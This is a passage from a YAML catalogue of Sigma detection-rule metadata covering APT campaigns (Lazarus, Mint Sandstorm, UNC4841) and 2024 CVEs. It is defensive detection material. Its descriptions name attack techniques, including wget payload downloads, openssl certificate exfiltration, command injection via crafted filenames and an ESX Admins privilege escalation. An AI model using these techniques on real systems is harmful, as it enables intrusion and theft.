  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 745ea50b-9673-4ba7-9426-cb45cf4a8e6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lace-Tempest/proc_creation_win_apt_lace_tempest_loader_execution.yml
  name: Lace Tempest Malware Loader Execution
  description: Detects execution of a specific binary based on filename and hash used
    by Lace Tempest to load additional malware as reported by SysAid Team
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 24007168-a26b-4049-90d0-ce138e13a5cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lazarus/image_load_apt_lazarus_side_load_activity.yml
  name: Lazarus APT DLL Sideloading Activity
  description: Detects sideloading of trojanized DLLs used in Lazarus APT campaign
    in the case of a Spanish aerospace company
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1574.001
  - attack.g0032
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/en/eset-research/lazarus-luring-employees-trojanized-coding-challenges-case-spanish-aerospace-company/
  - https://www.bleepingcomputer.com/news/security/lazarus-hackers-breach-aerospace-firm-with-new-lightlesscan-malware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 91048c0d-5b81-4b85-a099-c9ee4fb87979
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process.yml
  name: Mint Sandstorm - AsperaFaspex Suspicious Process Execution
  description: Detects suspicious execution from AsperaFaspex as seen used by Mint
    Sandstorm
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7c97c625-0350-4f0a-8943-f6cadc88125e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_log4j_wstomcat_execution.yml
  name: Mint Sandstorm - Log4J Wstomcat Process Execution
  description: Detects Log4J Wstomcat process execution as seen in Mint Sandstorm
    activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 58d8341a-5849-44cd-8ac8-8b020413a31b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process.yml
  name: Mint Sandstorm - ManageEngine Suspicious Process Execution
  description: Detects suspicious execution from ManageEngine as seen used by Mint
    Sandstorm
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7806bb49-f653-48d3-a915-5115c1a85234
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Mustang-Panda-Australia-Campaign/proc_creation_win_apt_mustang_panda_indicators.yml
  name: Potential APT Mustang Panda Activity Against Australian Gov
  description: Detects specific command line execution used by Mustang Panda in a
    targeted attack against the Australian government as reported by Lab52
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.g0129
  - detection.emerging-threats
  time_window: ''
  references:
  - https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 00a8e92a-776b-425f-80f2-82d8f8fab2e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Okta-Support-System-Breach/okta_apt_suspicious_user_creation.yml
  name: Okta 2023 Breach Indicator Of Compromise
  description: 'Detects new user account creation or activation with specific names
    related to the Okta Support System 2023 breach.

    This rule can be enhanced by filtering out known and legitimate username used
    in your environnement.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: okta
  product: okta
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.beyondtrust.com/blog/entry/okta-support-unit-breach
  - https://developer.okta.com/docs/reference/api/event-types/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2fef4fd9-7206-40d1-b4f5-ad6441d0cd9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Onyx-Sleet/file_event_win_apt_onyx_sleet_indicators.yml
  name: Onyx Sleet APT File Creation Indicators
  description: Detects file creation activity that is related to Onyx Sleet APT activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: de1bd0b6-6d59-417c-86d9-a44114aede3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_indicators.yml
  name: PaperCut MF/NG Exploitation Related Indicators
  description: Detects exploitation indicators related to PaperCut MF/NG Exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software
  - https://www.papercut.com/kb/Main/PO-1216-and-PO-1219
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0934ac71-a331-4e98-a034-d49c491fbbcb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/PaperCut-Print-Management-Exploitation/proc_creation_win_papercut_print_management_exploitation_pc_app.yml
  name: PaperCut MF/NG Potential Exploitation
  description: Detects suspicious child processes of "pc-app.exe". Which could indicate
    potential exploitation of PaperCut
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software
  - https://github.com/huntresslabs/threat-intel/blob/3bad6b0fadfcca3ff5680923e74e39edd72f32da/2023/2023-04/20-PaperCut/win_susp_papercut_code_execution.yml
  false_positives:
  - Legitimate administration activity
  notes: ''
- detection_id: 2e7bbd54-2f26-476e-b4a1-ba5f1a012614
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Peach-Sandstorm/proc_creation_win_apt_peach_sandstorm_indicators.yml
  name: Peach Sandstorm APT Process Activity Indicators
  description: Detects process creation activity related to Peach Sandstorm APT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/MsftSecIntel/status/1737895710169628824
  - https://www.virustotal.com/gui/file/364275326bbfc4a3b89233dabdaf3230a3d149ab774678342a40644ad9f8d614/details
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b8225208-81d0-4715-a822-12bcdd583e0f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Peach-Sandstorm/proxy_apt_peach_sandstorm_falsefont_backdoor_c2_coms.yml
  name: Potential Peach Sandstorm APT C2 Communication Activity
  description: Detects potential C2 communication activity related to Peach Sandstorm
    APT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/MsftSecIntel/status/1737895710169628824
  - https://www.virustotal.com/gui/file/364275326bbfc4a3b89233dabdaf3230a3d149ab774678342a40644ad9f8d614/details
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0785f462-60b0-4031-9ff4-b4f3a0ba589a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/file_event_lnx_apt_unc4841_exfil_mail_pattern.yml
  name: UNC4841 - Email Exfiltration File Pattern
  description: Detects filename pattern of email related data used by UNC4841 for
    staging and exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.execution
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5627c337-a9b2-407a-a82d-5fd97035ff39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/file_event_lnx_apt_unc4841_file_indicators.yml
  name: UNC4841 - Barracuda ESG Exploitation Indicators
  description: Detects file indicators as seen used by UNC4841 during their Barracuda
    ESG zero day exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.execution
  - attack.persistence
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 60911c07-f989-4362-84af-c609828ef829
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_openssl_connection.yml
  name: UNC4841 - SSL Certificate Exfiltration Via Openssl
  description: Detects the execution of "openssl" to connect to an IP address. This
    techniques was used by UNC4841 to exfiltrate SSL certificates and as a C2 channel
    with named pipes. Investigate commands executed in the temporal vicinity of this
    command.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60d050c4-e253-4d9a-b673-5ac100cfddfb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_wget_download_compressed_file_tmep_sh.yml
  name: UNC4841 - Download Compressed Files From Temp.sh Using Wget
  description: Detects execution of "wget" to download a ".zip" or ".rar" files from
    "temp.sh". As seen used by UNC4841 during their Barracuda ESG zero day exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: 23835beb-ec38-4e74-a5d4-b99af6684e91
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yml
  name: UNC4841 - Download Tar File From Untrusted Direct IP Via Wget
  description: Detects execution of "wget" to download a "tar" from an IP address
    that doesn't have a trusted certificate. As seen used by UNC4841 during their
    Barracuda ESG zero day exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: f6a711f3-d032-4f9e-890b-bbe776236c84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_atp_unc4841_seaspy_execution.yml
  name: UNC4841 - Potential SEASPY Execution
  description: Detects execution of specific named binaries which were used by UNC4841
    to deploy their SEASPY backdoor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unlikely
  notes: ''
- detection_id: eafb8bd5-7605-4bfe-a9ec-0442bc151f15
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1212/web_exploit_cve_2024_1212_.yml
  name: CVE-2024-1212 Exploitation - Progress Kemp LoadMaster Unauthenticated Command
    Injection
  description: 'Detects potential exploitation of CVE-2024-1709 an unauthenticated
    command injection in Progress Kemp LoadMaster.

    It looks for GET requests to ''/access/set'' API with the parameters ''param=enableapi''
    and ''value=1'' as well as an "Authorization" header with a base64 encoded value
    with an uncommon character.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - cve.2024-1212
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/RhinoSecurityLabs/CVEs/blob/15cf4d86c83daa57b59eaa2542a0ed47ad3dc32d/CVE-2024-1212/CVE-2024-1212.py
  - https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 44d7af7e-88e6-4490-be11-55f7ff4d9fc1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1708/file_event_win_exploit_cve_2024_1708_screenconnect.yml
  name: CVE-2024-1708 - ScreenConnect Path Traversal Exploitation
  description: 'This detects file modifications to ASPX and ASHX files within the
    root of the App_Extensions directory, which is allowed by a ZipSlip vulnerability
    in versions prior to 23.9.8. This occurs during exploitation of CVE-2024-1708.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - cve.2024-1708
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  - https://www.cve.org/CVERecord?id=CVE-2024-1709
  - https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  false_positives:
  - This will occur legitimately as well and will result in some benign activity.
  notes: ''
- detection_id: 4c198a60-7d05-4daf-8bf7-4136fb6f5c62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1708/win_security_exploit_cve_2024_1708_screenconnect.yml
  name: CVE-2024-1708 - ScreenConnect Path Traversal Exploitation - Security
  description: 'This detects file modifications to ASPX and ASHX files within the
    root of the App_Extensions directory, which is allowed by a ZipSlip vulnerability
    in versions prior to 23.9.8. This occurs during exploitation of CVE-2024-1708.

    This requires an Advanced Auditing policy to log a successful Windows Event ID
    4663 events and with a SACL set on the directory.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - cve.2024-1708
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  - https://www.cve.org/CVERecord?id=CVE-2024-1708
  - https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a821580-588b-4323-9422-660f7e131020
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1709/file_event_win_exploit_cve_2024_1709_user_database_modification_screenconnect.yml
  name: ScreenConnect User Database Modification
  description: 'Detects file modifications to the temporary xml user database file
    indicating local user modification in the ScreenConnect server.

    This will occur during exploitation of the ScreenConnect Authentication Bypass
    vulnerability (CVE-2024-1709) in versions <23.9.8, but may also be observed when
    making legitimate modifications to local users or permissions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - cve.2024-1709
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  - https://www.cve.org/CVERecord?id=CVE-2024-1709
  - https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  false_positives:
  - This will occur legitimately as well and will result in some benign activity.
  notes: ''
- detection_id: d27eabad-9068-401a-b0d6-9eac744d6e67
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1709/web_exploit_cve_2024_1709_screenconnect.yml
  name: CVE-2024-1709 - ScreenConnect Authentication Bypass Exploitation
  description: 'Detects GET requests to ''/SetupWizard.aspx/[anythinghere]'' that
    indicate exploitation of the ScreenConnect vulnerability CVE-2024-1709.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - cve.2024-1709
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  - https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  - https://www.cve.org/CVERecord?id=CVE-2024-1709
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4109cb6a-a4af-438a-9f0c-056abba41c6f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-1709/win_security_exploit_cve_2024_1709_user_database_modification_screenconnect.yml
  name: ScreenConnect User Database Modification - Security
  description: 'This detects file modifications to the temporary xml user database
    file indicating local user modification in the ScreenConnect server.

    This will occur during exploitation of the ScreenConnect Authentication Bypass
    vulnerability (CVE-2024-1709) in versions <23.9.8, but may also be observed when
    making legitimate modifications to local users or permissions.

    This requires an Advanced Auditing policy to log a successful Windows Event ID
    4663 events and with a SACL set on the directory.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - cve.2024-1709
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  - https://www.cve.org/CVERecord?id=CVE-2024-1709
  - https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  false_positives:
  - This will occur legitimately as well and will result in some benign activity.
  notes: ''
- detection_id: 9aa27839-e8ba-4d7a-ac1a-746c22c3d1e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-3094/proc_creation_lnx_exploit_cve_2024_3094_sshd_child_process.yml
  name: Potential Exploitation of CVE-2024-3094 - Suspicious SSH Child Process
  description: 'Detects potentially suspicious child process of SSH process (sshd)
    with a specific execution user. This could be a sign of potential exploitation
    of CVE-2024-3094.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2024-3094
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/amlweems/xzbot?tab=readme-ov-file#backdoor-demo
  false_positives:
  - Administrative activity directly with root authentication might trigger this rule
    if it's unnecessarily prefixed with "sh -c" or "bash -c"
  notes: ''
- detection_id: bcd95697-e3e7-4c6f-8584-8e3503e6929f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-3400/file_event_paloalto_globalprotect_exploit_cve_2024_3400_command_inject_file_creation.yml
  name: Potential CVE-2024-3400 Exploitation - Palo Alto GlobalProtect OS Command
    Injection - File Creation
  description: 'Detects suspicious file creations in the Palo Alto Networks PAN-OS''
    parent telemetry folder, which are processed by the vulnerable ''dt_curl'' script
    if device telemetry is enabled.

    As said script overrides the shell-subprocess restriction, arbitrary command execution
    may occur by carefully crafting filenames that are escaped through this function.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: paloalto
  product: globalprotect
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2024-3400
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
  false_positives:
  - The PAN-OS device telemetry function does not enforce a standard filename convention,
    but observations are unlikely.
  notes: ''
- detection_id: f130a5f1-73ba-42f0-bf1e-b66a8361cb8f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-3400/paloalto_globalprotect_exploit_cve_2024_3400_command_injection.yml
  name: Potential CVE-2024-3400 Exploitation - Palo Alto GlobalProtect OS Command
    Injection
  description: 'Detects potential exploitation attempts of CVE-2024-3400 - an OS command
    injection in Palo Alto GlobalProtect.

    This detection looks for suspicious strings that indicate a potential directory
    traversal attempt or command injection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: paloalto
  product: globalprotect
  category: appliance
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - cve.2024-3400
  - detection.emerging-threats
  time_window: ''
  references:
  - https://security.paloaltonetworks.com/CVE-2024-3400
  - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/
  - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
  false_positives:
  - Unknown
  notes: ''
- detection_id: 17ce9373-2163-4a2c-90ba-f91e9ef7a8c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-35250/image_load_exploit_cve_2024_35250_privilege_escalation.yml
  name: Potential CVE-2024-35250 Exploitation Activity
  description: 'Detects potentially suspicious loading of "ksproxy.ax", which may
    indicate an attempt to exploit CVE-2024-35250.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2024-35250
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thehackernews.com/2024/12/cisa-and-fbi-raise-alerts-on-exploited.html
  - https://github.com/varwara/CVE-2024-35250
  - https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  false_positives:
  - Legitimate applications that use Windows Stream Interface APIs.
  - Media applications that use DirectShow filters.
  notes: ''
- detection_id: c408acfe-2870-41df-8d2f-9f4daa4555ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-37085/proc_creation_win_exploit_cve_2024_37085_esxi_admins_group_creation.yml
  name: Potential Exploitation of CVE-2024-37085 - Suspicious Creation Of ESX Admins
    Group
  description: 'Detects execution of the "net.exe" command in order to add a group
    named "ESX Admins".

    This could indicates a potential exploitation attempt of CVE-2024-37085, which
    allows an attacker to elevate their privileges to full administrative access on
    an domain-joined ESXi hypervisor.

    VMware ESXi hypervisors joined to an Active Directory domain consider any member
    of a domain group named "ESX Admins" to have full administrative access by default.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
